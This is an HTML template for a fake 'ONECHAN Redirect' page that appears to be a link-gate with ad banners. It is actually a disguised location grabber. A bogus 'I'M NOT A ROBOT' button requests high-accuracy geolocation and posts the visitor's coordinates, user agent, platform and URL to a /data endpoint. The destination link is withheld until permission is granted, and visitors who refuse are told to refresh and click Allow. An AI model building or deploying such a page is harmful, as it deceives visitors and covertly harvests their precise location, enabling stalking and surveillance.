<!DOCTYPE html>
<html>
	<head>
		<title>ONECHAN Redirect</title>
		<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
		<link rel="stylesheet" href="/static/css/font-awesome/css/font-awesome.min.css">
		<meta name="viewport" content="width = device-width, initial-scale = 1.0">
	</head>
	<body onload="setTimeout(myFunction, 5000);">
		<header>
			<img class="logo" src="/static/img/logo.png" alt="logo-onechan">
		</header>
		<!-- Body -->
		<section class="banner-area">
			<div class="banner-img"></div>
				<h1>ONECHAN Redirect</h1>
				<a href="#direct"><button id ="find-me">Tunggu Sebentar...</button></a><br/>
		</section>
		<section>
				<iframe data-aa="1606786" src="//ad.a-ads.com/1606786?size=728x90" scrolling="no" style="width:728px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1606788" src="//ad.a-ads.com/1606788?size=970x90" scrolling="no" style="width:970px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1606786" src="//ad.a-ads.com/1606786?size=728x90" scrolling="no" style="width:728px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1606788" src="//ad.a-ads.com/1606788?size=970x90" scrolling="no" style="width:970px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1606786" src="//ad.a-ads.com/1606786?size=728x90" scrolling="no" style="width:728px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1606788" src="//ad.a-ads.com/1606788?size=970x90" scrolling="no" style="width:970px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
				<iframe data-aa="1601606" src="//ad.a-ads.com/1601606?size=728x90" scrolling="no" style="width:728px; height:90px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
		</section>
		<section>
			<div id="message"></div>
			<a href={{ hasil }}><button id = "direct">NEXT</button></a>
		</section>
		<form method="post" action="/data">
		</form>
		<!-- end body -->
		<footer>
			<p>Copyright &copy; 2021 OneChan. All Rights Reserved.</p>
		</footer>
		<script type="text/javascript">
			document.getElementById("find-me").disabled = true;
			document.getElementById("direct").disabled = true;
			const url = window.location.href;
			var ua = navigator.userAgent;
			var pf = navigator.platform;
			function myFunction() {
				document.getElementById("find-me").innerHTML = "I'M NOT A ROBOT";
				document.getElementById("find-me").disabled = false;
			}
			function geoFindMe() {
				  function success(position) {
					const {
						latitude,
						longitude,
					} = position.coords;
					fetch('/data', {
						method: 'POST',
						headers: {
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							URL: url,
							Lat: latitude,
							Lon: longitude,
							UAgent: ua,
							Platform: pf
						})
					}).then(res => {
						return res.json()
						})
					document.getElementById("direct").disabled = false;
				  }

				  function error() {
					document.getElementById("find-me").disabled = true;
					fetch('/data', {
						method: 'POST',
						headers: {
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							URL: url,
							Lat: "Akses ditolak!",
							Lon: "Akses ditolak!",
							UAgent: ua,
							Platform: pf
						})
					}).then(res => {
						return res.json()
						})
					alert('Tidak bisa mendapatkan link, silahkan refresh dan klik Allow pada notifikasi.');
				  }

				  if(!navigator.geolocation) {
					alert('Geolocation is not supported by your browser');
				  } else {
					var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
					navigator.geolocation.getCurrentPosition(success, error, optn);
				  }

				}

			document.querySelector('#find-me').addEventListener('click', geoFindMe);
		</script>
	</body>
</html>
